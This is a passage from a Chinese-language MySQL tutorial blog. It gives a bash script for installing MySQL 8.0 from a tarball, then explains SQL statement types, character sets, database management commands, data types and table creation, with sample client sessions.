class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#bin/bash</span><br><span class="hljs-comment">#https://dev.mysql.com/downloads/mysql/</span><br><br>. /etc/init.d/functions<br>SRC_DIR=`<span class="hljs-built_in">pwd</span>`<br><br>MYSQL=<span class="hljs-string">&#x27;mysql-8.0.31-linux-glibc2.12-x86_64.tar.xz&#x27;</span><br><span class="hljs-comment">#MYSQL=&#x27;mysql-8.0.23-linux-glibc2.12-x86_64.tar.xz&#x27;</span><br>MYSQL_ROOT_PASSWORD=123456<br><br><br>COLOR=<span class="hljs-string">&#x27;echo -e \E[01;31m&#x27;</span><br>END=<span class="hljs-string">&#x27;\E[0m&#x27;</span><br><br><br><span class="hljs-function"><span class="hljs-title">check</span></span> ()&#123;<br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$UID</span> -ne 0 ]; <span class="hljs-keyword">then</span><br>  action <span class="hljs-string">&quot;当前用户不是root,安装失败&quot;</span> <span class="hljs-literal">false</span><br>  <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">cd</span>  <span class="hljs-variable">$SRC_DIR</span><br><br><br><span class="hljs-keyword">if</span> [ !  -e <span class="hljs-variable">$MYSQL</span> ];<span class="hljs-keyword">then</span><br>        <span class="hljs-variable">$COLOR</span><span class="hljs-string">&quot;缺少<span class="hljs-variable">$&#123;MYSQL&#125;</span>文件&quot;</span><span class="hljs-variable">$END</span><br><span class="hljs-variable">$COLOR</span><span class="hljs-string">&quot;请将相关软件放在<span class="hljs-variable">$&#123;SRC_DIR&#125;</span>目录下&quot;</span><span class="hljs-variable">$END</span><br>        <span class="hljs-built_in">exit</span><br><span class="hljs-keyword">elif</span> [ -e /usr/local/mysql ];<span class="hljs-keyword">then</span><br>        action <span class="hljs-string">&quot;数据库已存在，安装失败&quot;</span> <span class="hljs-literal">false</span><br>        <span class="hljs-built_in">exit</span><br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">return</span><br><span class="hljs-keyword">fi</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">install_mysql</span></span>()&#123;<br>    <span class="hljs-variable">$COLOR</span><span class="hljs-string">&quot;开始安装MySQL数据库...&quot;</span><span class="hljs-variable">$END</span><br>    yum  -y -q install libaio numactl-libs<br>    tar xf <span class="hljs-variable">$MYSQL</span> -C /usr/local/<br>    MYSQL_DIR=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$MYSQL</span>| sed -nr <span class="hljs-string">&#x27;s/^(.*[0-9]).*/\1/p&#x27;</span>`<br>    <span class="hljs-built_in">ln</span> -s  /usr/local/<span class="hljs-variable">$MYSQL_DIR</span> /usr/local/mysql<br>    <span class="hljs-built_in">chown</span> -R  root.root /usr/local/mysql/<br>    <span class="hljs-built_in">id</span> mysql &amp;&gt; /dev/null || &#123; useradd -s /sbin/nologin -r  mysql ; action <span class="hljs-string">&quot;创建mysql用户&quot;</span>; &#125;<br><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PATH=/usr/local/mysql/bin/:$PATH&#x27;</span> &gt; /etc/profile.d/mysql.sh<br>    .  /etc/profile.d/mysql.sh<br><span class="hljs-built_in">ln</span> -s /usr/local/mysql/bin/* /usr/bin/<br>    <span class="hljs-built_in">cat</span> &gt; /etc/my.cnf &lt;&lt;-<span class="hljs-string">EOF</span><br><span class="hljs-string">[mysqld]</span><br><span class="hljs-string">server-id=`hostname -I|cut -d. -f4`</span><br><span class="hljs-string">log-bin</span><br><span class="hljs-string">datadir=/data/mysql</span><br><span class="hljs-string">socket=/data/mysql/mysql.sock</span><br><span class="hljs-string">log-error=/data/mysql/mysql.log</span><br><span class="hljs-string">pid-file=/data/mysql/mysql.pid</span><br><span class="hljs-string">[client]</span><br><span class="hljs-string">socket=/data/mysql/mysql.sock</span><br><span class="hljs-string">EOF</span><br>    [ -d /data ] || <span class="hljs-built_in">mkdir</span> /data<br>mysqld --initialize-insecure --user=mysql --datadir=/data/mysql<br>    <span class="hljs-built_in">cp</span> /usr/local/mysql/support-files/mysql.server  /etc/init.d/mysqld<br>    chkconfig --add mysqld<br>    chkconfig mysqld on<br>    service mysqld start<br>    [ $? -ne 0 ] &amp;&amp; &#123; <span class="hljs-variable">$COLOR</span><span class="hljs-string">&quot;数据库启动失败，退出!&quot;</span><span class="hljs-variable">$END</span>;<span class="hljs-built_in">exit</span>; &#125;<br>    <span class="hljs-comment">#MYSQL_OLDPASSWORD=`awk &#x27;/A temporary password/&#123;print $NF&#125;&#x27; /data/mysql/mysql.log`</span><br>    <span class="hljs-comment">#mysqladmin  -uroot -p$MYSQL_OLDPASSWORD password $MYSQL_ROOT_PASSWORD &amp;&gt;/dev/null</span><br><span class="hljs-built_in">sleep</span> 3<br>    mysqladmin  -uroot  password <span class="hljs-variable">$MYSQL_ROOT_PASSWORD</span> &amp;&gt;/dev/null<br>    action <span class="hljs-string">&quot;数据库安装完成&quot;</span><br>&#125;<br><br><br>check<br><br>install_mysql<br></code></pre></td></tr></table></figure><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><hr><h1 id="三、SQL-语言"><a href="#三、SQL-语言" class="headerlink" title="三、SQL 语言"></a>三、SQL 语言</h1><h2 id="1-关系型数据库的常见组件"><a href="#1-关系型数据库的常见组件" class="headerlink" title="1 关系型数据库的常见组件"></a>1 关系型数据库的常见组件</h2><blockquote><ul><li>数据库：database 表的集合，物理上表现为一个目录</li><li>表：table，行：row 列：column</li><li>索引：index</li><li>视图：view，虚拟的表</li><li>存储过程：procedure</li><li>存储函数：function</li><li>触发器：trigger</li><li>事件调度器：event scheduler，任务计划</li><li>用户：user</li><li>权限：privilege</li></ul></blockquote><h2 id="2-SQL-语法标准"><a href="#2-SQL-语法标准" class="headerlink" title="2 SQL 语法标准"></a>2 SQL 语法标准</h2><h3 id="2-1-SQL-语言规范"><a href="#2-1-SQL-语言规范" class="headerlink" title="2.1 SQL 语言规范"></a>2.1 SQL 语言规范</h3><blockquote><ul><li>在数据库系统中，SQL 语句不区分大小写，建议用大写</li><li>SQL语句可单行或多行书写，默认以 “ ; “ 结尾</li><li>关键词不能跨多行或简写</li><li>用空格和TAB 缩进来提高语句的可读性</li><li>子句通常位于独立行，便于编辑，提高可读性</li></ul><p><strong>注释：</strong></p><ul><li>SQL标准：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#单行注释，注意有空格</span><br>-- 注释内容   <br><br><span class="hljs-comment">#多行注释</span><br>/*注释内容<br>注释内容<br>注释内容*/  <br></code></pre></td></tr></table></figure><ul><li>MySQL注释：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 注释内容</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="2-2-数据库对象和命名"><a href="#2-2-数据库对象和命名" class="headerlink" title="2.2 数据库对象和命名"></a>2.2 数据库对象和命名</h3><blockquote><p><strong>数据库的组件</strong>**(<strong><strong>对象</strong></strong>)**<strong>：</strong></p><ul><li>数据库、表、索引、视图、用户、存储过程、函数、触发器、事件调度器等</li></ul><p><strong>命名规则：</strong></p><ul><li>必须以字母开头，后续可以包括字母,数字和三个特殊字符（# _ $）</li><li>不要使用MySQ</li></ul></blockquote><h3 id="2-3-SQL语句分类"><a href="#2-3-SQL语句分类" class="headerlink" title="2.3 SQL语句分类"></a>2.3 SQL语句分类</h3><blockquote><ul><li><strong>DDL: Data Defination Language 数据定义语言</strong></li></ul><p>    <strong>CREATE，DROP，ALTER</strong></p><ul><li><strong>DML: Data Manipulation Language 数据操纵语言</strong></li></ul><p>    <strong>INSERT，DELETE，UPDATE</strong></p><p>    软件开发：CRUD</p><ul><li><strong>DQL：Data Query Language 数据查询语言</strong></li></ul><p>    <strong>SELECT</strong></p><ul><li>DCL：Data Control Language 数据控制语言</li></ul><p>    GRANT，REVOKE</p><ul><li>TCL：Transaction Control Language 事务控制语言</li></ul><p>    COMMIT，ROLLBACK，SAVEPOINT</p></blockquote><h3 id="2-4-SQL语句构成"><a href="#2-4-SQL语句构成" class="headerlink" title="2.4 SQL语句构成"></a>2.4 SQL语句构成</h3><p>关健字Keyword组成子句clause，多条clause组成语句</p><p>示例：一组SQL语句由三个子句构成，SELECT,FROM和WHERE是关键字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">SELECT *         <span class="hljs-comment">#SELECT子句</span><br>FROM products    <span class="hljs-comment">#FROM子句</span><br>WHERE price&gt;666  <span class="hljs-comment">#WHERE子句</span><br></code></pre></td></tr></table></figure><h4 id="范例：查看SQL帮助"><a href="#范例：查看SQL帮助" class="headerlink" title="范例：查看SQL帮助"></a>范例：查看SQL帮助</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost (none)]&gt; <span class="hljs-built_in">help</span> contents<br>You asked <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span> about <span class="hljs-built_in">help</span> category: <span class="hljs-string">&quot;Contents&quot;</span><br>For more information, <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;help &lt;item&gt;&#x27;</span>, <span class="hljs-built_in">where</span> &lt;item&gt; is one of the following<br>categories:<br>   Account Management<br>   Administration<br>   Components<br>   Compound Statements<br>   Contents<br>   Data Definition<br>   Data Manipulation<br>   Data Types<br>...省略...<br></code></pre></td></tr></table></figure><h3 id="2-5-字符集和排序"><a href="#2-5-字符集和排序" class="headerlink" title="2.5 字符集和排序"></a>2.5 字符集和排序</h3><p>早期MySQL版本默认为 latin1，从MySQL8.0开始默认字符集已经为 utf8mb4</p><h4 id="查看支持所有字符集"><a href="#查看支持所有字符集" class="headerlink" title="查看支持所有字符集"></a>查看支持所有字符集</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW CHARACTER SET;<br>SHOW CHARSET;<br></code></pre></td></tr></table></figure><h4 id="查看当前使用的字符集"><a href="#查看当前使用的字符集" class="headerlink" title="查看当前使用的字符集"></a>查看当前使用的字符集</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW VARIABLES LIKE <span class="hljs-string">&#x27;%char%&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="查看支持所有排序规则"><a href="#查看支持所有排序规则" class="headerlink" title="查看支持所有排序规则"></a>查看支持所有排序规则</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW COLLATION;<br><span class="hljs-comment">#注意</span><br>utf8_general_ci不区分大小写<br>utf8_bin 区分大小写<br></code></pre></td></tr></table></figure><h4 id="查看当前使用的排序规则"><a href="#查看当前使用的排序规则" class="headerlink" title="查看当前使用的排序规则"></a>查看当前使用的排序规则</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW VARIABLES LIKE <span class="hljs-string">&#x27;collation%&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="设置服务器默认的字符集"><a href="#设置服务器默认的字符集" class="headerlink" title="设置服务器默认的字符集"></a>设置服务器默认的字符集</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/my.cnf<br>[mysqld]<br>character-set-server=utf8mb4<br></code></pre></td></tr></table></figure><h4 id="设置客户端默认的字符集"><a href="#设置客户端默认的字符集" class="headerlink" title="设置客户端默认的字符集"></a>设置客户端默认的字符集</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/my.cnf<br><span class="hljs-comment">#针对mysql客户端</span><br>[mysql]<br>default-character-set=utf8mb4<br><span class="hljs-comment">#针对所有MySQL客户端</span><br>[client]<br>default-character-set=utf8mb4<br></code></pre></td></tr></table></figure><hr><h2 id="3-管理数据库"><a href="#3-管理数据库" class="headerlink" title="3 管理数据库"></a>3 管理数据库</h2><h3 id="3-1-创建数据库"><a href="#3-1-创建数据库" class="headerlink" title="3.1 创建数据库"></a>3.1 创建数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">CREATE DATABASE|SCHEMA [IF NOT EXISTS] <span class="hljs-string">&#x27;DB_NAME&#x27;</span><br>CHARACTER SET <span class="hljs-string">&#x27;character set name&#x27;</span><br>COLLATE <span class="hljs-string">&#x27;collate name&#x27;</span>;<br><br><span class="hljs-comment">#Mysql中DATABASE和SCHEMA是等价的</span><br></code></pre></td></tr></table></figure><h4 id="范例：常见用法"><a href="#范例：常见用法" class="headerlink" title="范例：常见用法"></a>范例：常见用法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建数据库</span><br>[root@localhost (none)]&gt; create database IF NOT EXISTS db1;<br>Query OK, 1 row affected (0.00 sec)<br><br><span class="hljs-comment">#显示创建数据库的语句</span><br>[root@localhost (none)]&gt; show create database db1;<br>+----------+-------------------------------------------------------------------------------------------------------------------------------+<br>| Database | Create Database                       |<br>+----------+-------------------------------------------------------------------------------------------------------------------------------+<br>| db1      | CREATE DATABASE `db1` /*!40100 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci */ /*!80016 DEFAULT ENCRYPTION=<span class="hljs-string">&#x27;N&#x27;</span> */ |<br>+----------+-------------------------------------------------------------------------------------------------------------------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment">#显示warnings</span><br>[root@localhost (none)]&gt; show warnings;<br>Empty <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment">#创建数据库</span><br>[root@localhost (none)]&gt; create database IF NOT EXISTS db1;<br>Query OK, 1 row affected, 1 warning (0.00 sec)<br><br><span class="hljs-comment">#显示warnings</span><br>[root@localhost (none)]&gt; show warnings;<br>+-------+------+----------------------------------------------+<br>| Level | Code | Message                                      |<br>+-------+------+----------------------------------------------+<br>| Note  | 1007 | Can<span class="hljs-string">&#x27;t create database &#x27;</span>db1<span class="hljs-string">&#x27;; database exists |</span><br><span class="hljs-string">+-------+------+----------------------------------------------+</span><br><span class="hljs-string">1 row in set (0.00 sec)</span><br></code></pre></td></tr></table></figure><h4 id="范例：指定字符集创建数据库"><a href="#范例：指定字符集创建数据库" class="headerlink" title="范例：指定字符集创建数据库"></a>范例：指定字符集创建数据库</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#指定字符集</span><br>[root@localhost (none)]&gt; create database IF NOT EXISTS db2 CHARACTER SET <span class="hljs-string">&#x27;utf8&#x27;</span>;<br>Query OK, 1 row affected, 1 warning (0.00 sec)<br><br><span class="hljs-comment">#简写</span><br>create database db2 charset=utf8;<br><br><span class="hljs-comment">#指定字符集和排序规则（utf8_bin为区分大小写）</span><br>[root@localhost (none)]&gt; create database zabbix character <span class="hljs-built_in">set</span> utf8 collate utf8_bin;<br></code></pre></td></tr></table></figure><h3 id="3-2-修改数据库"><a href="#3-2-修改数据库" class="headerlink" title="3.2 修改数据库"></a>3.2 修改数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ALTER DATABASE DB_NAME character <span class="hljs-built_in">set</span> utf8;<br></code></pre></td></tr></table></figure><p>范例：使用方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#改变数据库的字符集和排序规则</span><br>[root@localhost (none)]&gt;  ALTER DATABASE db1 character <span class="hljs-built_in">set</span> utf8 COLLATE utf8_bin;<br>Query OK, 1 row affected, 2 warnings (0.00 sec)<br></code></pre></td></tr></table></figure><h3 id="3-3-删除数据库"><a href="#3-3-删除数据库" class="headerlink" title="3.3 删除数据库"></a>3.3 删除数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">DROP DATABASE|SCHEMA [IF EXISTS] <span class="hljs-string">&#x27;DB_NAME&#x27;</span>;<br></code></pre></td></tr></table></figure><p>范例：使用方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost (none)]&gt; drop database db1;<br>Query OK, 0 rows affected (0.00 sec)<br><br>[root@rocky01 ~]<span class="hljs-comment"># ls -l /var/lib/mysql |grep ^d</span><br>drwxr-x--- 2 mysql mysql      187 Oct 24 00:29 <span class="hljs-comment">#innodb_temp</span><br>drwxr-x--- 2 mysql mysql      143 Oct 23 15:38 mysql<br>drwxr-x--- 2 mysql mysql     8192 Oct 23 15:38 performance_schema<br>drwxr-x--- 2 mysql mysql       28 Oct 23 15:38 sys<br></code></pre></td></tr></table></figure><h3 id="3-4-查看数据库列表"><a href="#3-4-查看数据库列表" class="headerlink" title="3.4 查看数据库列表"></a>3.4 查看数据库列表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW DATABASES;<br></code></pre></td></tr></table></figure><p> 范例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost (none)]&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| sys                |<br>+--------------------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><hr><h2 id="4-数据类型"><a href="#4-数据类型" class="headerlink" title="4 数据类型"></a>4 数据类型</h2><blockquote><p><strong>数据类型</strong>：</p><ul><li>数据长什么样</li><li>数据需要多少空间来存放</li></ul><p><strong>数据类型</strong></p><ul><li>系统内置数据类型</li><li>用户定义数据类型</li></ul><p><strong>MySQL****支持多种内置数据类型</strong></p><ul><li>数值类型</li><li>日期/时间类型</li><li>字符串(字符)类型</li></ul></blockquote><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221024144010486-207436707.png"><img src="2927659-20221024144010486-207436707.png" alt="img"></a></p><blockquote><p><strong>选择正确的数据类型对于获得高性能至关重要，三大原则：</strong></p><ol><li>更小的通常更好，尽量使用可正确存储数据的最小数据类型</li><li>简单就好，简单数据类型的操作通常需要更少的CPU周期</li><li>尽量避免NULL，包含为NULL的列，对MySQL更难优化</li></ol></blockquote><h3 id="4-1-整数型"><a href="#4-1-整数型" class="headerlink" title="4.1 整数型"></a>4.1 整数型</h3><blockquote><ul><li>tinyint(m) 1个字节 范围(-128~127)</li><li>smallint(m) 2个字节 范围(-32768~32767)</li><li>mediumint(m) 3个字节 范围(-8388608~8388607)</li><li>int(m) 4个字节 范围(-2147483648~2147483647)</li><li>bigint(m) 8个字节 范围(+-9.22*10的18次方)</li></ul><p><strong>上述数据类型，如果加修饰符unsigned（取消负数，全是正数）后，则最大值翻倍</strong></p><p><strong>如：tinyint unsigned的取值范围为(0~255)</strong></p><p><strong>int(m)里的m是表示SELECT查询结果集中的显示宽度</strong>，并不影响实际的取值范围，规定了MySQL的一些交互工具（例如MySQL命令行客户端）用来显示字符的个数。对于存储和计算来说，Int(1)和Int(20)是相同的</p><p>BOOL，BOOLEAN：布尔型，是TINYINT(1)的同义词。zero值被视为假，非zero值视为真</p></blockquote><h3 id="4-2-浮点型-float和double-，近似值"><a href="#4-2-浮点型-float和double-，近似值" class="headerlink" title="4.2 浮点型(float和double)，近似值"></a>4.2 浮点型(float和double)，近似值</h3><blockquote><p>float(m,d) 单精度浮点型 8位精度(4字节) m总个数，d小数位, 注意: 小数点不占用总个数</p><p>double(m,d) 双精度浮点型16位精度(8字节) m总个数，d小数位, 注意: 小数点不占用总个数</p><p>设一个字段定义为float(6,3)，如果插入一个数123.45678,实际数据库里存的是123.457，但总个数还以实际为准，即6位</p></blockquote><h3 id="4-3-定点数"><a href="#4-3-定点数" class="headerlink" title="4.3 定点数"></a>4.3 定点数</h3><h3 id="4-4-字符串-char-varchar-text"><a href="#4-4-字符串-char-varchar-text" class="headerlink" title="4.4 字符串(char,varchar,text)"></a>4.4 字符串(char,varchar,text)</h3><blockquote><ul><li>char(n) 固定长度，最多255个字符,注意不是字节</li><li>varchar(n) 可变长度，最多65535个字符</li><li>tinytext 可变长度，最多255个字符</li><li>text 可变长度，最多65535个字符</li><li>mediumtext 可变长度，最多2的24次方-1个字符</li><li>longtext 可变长度，最多2的32次方-1个字符</li><li>BINARY(M) 固定长度，可存二进制或字符，长度为0-M字节</li><li>VARBINARY(M) 可变长度，可存二进制或字符，允许长度为0-M字节</li><li>内建类型：ENUM枚举, SET集合</li></ul><p>char类型的字符串检索速度要比varchar类型的快</p><p>varchar查询速度快于text</p></blockquote><p><strong>char<strong><strong>和</strong></strong>varchar****的比较：</strong></p><p><strong><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221024145636530-1221441424.png"><img src="2927659-20221024145636530-1221441424.png" alt="img"></a></strong></p><h4 id="面试题-VARCHAR-50-能存放几个-UTF8-编码的汉字？"><a href="#面试题-VARCHAR-50-能存放几个-UTF8-编码的汉字？" class="headerlink" title="面试题: VARCHAR(50) 能存放几个 UTF8 编码的汉字？"></a>面试题: VARCHAR(50) 能存放几个 UTF8 编码的汉字？</h4><blockquote><p>存放的汉字个数与版本相关。</p><ul><li>mysql 4.0以下版本，varchar(50) 指的是 50 字节，如果存放 UTF8 格式编码的汉字时（每个汉字3字节），只能存放16 个。</li><li>mysql 5.0以上版本，varchar(50) 指的是 50 字符，无论存放的是数字、字母还是 UTF8 编码的汉字，都可以存放 50 个。</li></ul></blockquote><h3 id="4-5-二进制数据BLOB"><a href="#4-5-二进制数据BLOB" class="headerlink" title="4.5 二进制数据BLOB"></a>4.5 二进制数据BLOB</h3><blockquote><p>BLOB和text存储方式不同，TEXT以文本方式存储，英文存储区分大小写，而Blob以二进制方式存储，不分大小写</p><p>BLOB存储的数据只能整体读出</p><p>TEXT可以指定字符集，BLOB不用指定字符集</p></blockquote><h3 id="4-6-日期时间类型"><a href="#4-6-日期时间类型" class="headerlink" title="4.6 日期时间类型"></a><strong>4.6</strong> <strong>日期时间类型</strong></h3><blockquote><p>date 日期 ‘2008-12-2’</p><p>time 时间 ‘12:25:36’</p><p>datetime 日期时间 ‘2008-12-2 22:06:44’</p><p>timestamp 自动存储记录修改时间</p><p>YEAR(2), YEAR(4)：年份</p><p>timestamp 此字段里的时间数据会随其他字段修改的时候自动刷新，这个数据类型的字段可以存放这条记录最后被修改的时间</p></blockquote><h3 id="4-7-修饰符"><a href="#4-7-修饰符" class="headerlink" title="4.7 修饰符"></a>4.7 修饰符</h3><blockquote><p><strong>适用所有类型的修饰符：</strong></p><ul><li>NULL 数据列可包含NULL值，默认值</li><li>NOT NULL 数据列不允许包含NULL值，相当于网站注册表中的 * 为必填选项</li><li>DEFAULT 默认值</li><li>PRIMARY KEY 主键，所有记录中此字段的值不能重复，且不能为NULL</li><li>UNIQUE KEY 唯一键，所有记录中此字段的值不能重复，但可以为NULL</li><li>CHARACTER SET name 指定一个字符集</li></ul><p><strong>适用数值型的修饰符：</strong></p><ul><li>AUTO_INCREMENT 自动递增，适用于整数类型, 必须作用于某个 key 的字段,比如primary key</li><li>UNSIGNED 无符号</li></ul></blockquote><h2 id="5-DDL-语句"><a href="#5-DDL-语句" class="headerlink" title="5 DDL 语句"></a>5 DDL 语句</h2><h3 id="5-1-create-创建表"><a href="#5-1-create-创建表" class="headerlink" title="5.1 create 创建表"></a>5.1 create 创建表</h3><h4 id="（1）-直接创建"><a href="#（1）-直接创建" class="headerlink" title="（1） 直接创建"></a>（1） 直接创建</h4><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">CREATE TABLE [IF NOT EXISTS] <span class="hljs-string">&#x27;tbl_name&#x27;</span> (col1 type1 修饰符, col2 type2 修饰符, ...)<br><span class="hljs-comment">#字段信息</span><br>col type1 <br>PRIMARY KEY(col1,...)<br>INDEX(col1, ...)<br>UNIQUE KEY(col1, ...)<br><span class="hljs-comment">#表选项：</span><br>ENGINE [=] engine_name<br>ROW_FORMAT [=] &#123;DEFAULT|DYNAMIC|FIXED|COMPRESSED|REDUNDANT|COMPACT&#125;<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>Storage Engine是指表类型，也即在表创建时指明其使用的存储引擎</li><li>同一库中不同表可以使用不同的存储引擎</li><li>同一个库中表建议要使用同一种存储引擎类型</li></ul></blockquote><h5 id="范例：用法"><a href="#范例：用法" class="headerlink" title="范例：用法"></a>范例：用法</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#直接创建表</span><br>[root@localhost zabbix]&gt; create table student (<br>    -&gt; <span class="hljs-built_in">id</span> tinyint unsigned primary key auto_increment ,<br>    -&gt; name char(4) not null,<br>    -&gt; gender char(1),<br>    -&gt; age tinyint unsigned  );<br>Query OK, 0 rows affected (0.01 sec)<br></code></pre></td></tr></table></figure><h4 id="（2）-通过查询现存表创建"><a href="#（2）-通过查询现存表创建" class="headerlink" title="（2） 通过查询现存表创建"></a>（2） 通过查询现存表创建</h4><blockquote><p>新表会被直接插入查询而来的数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 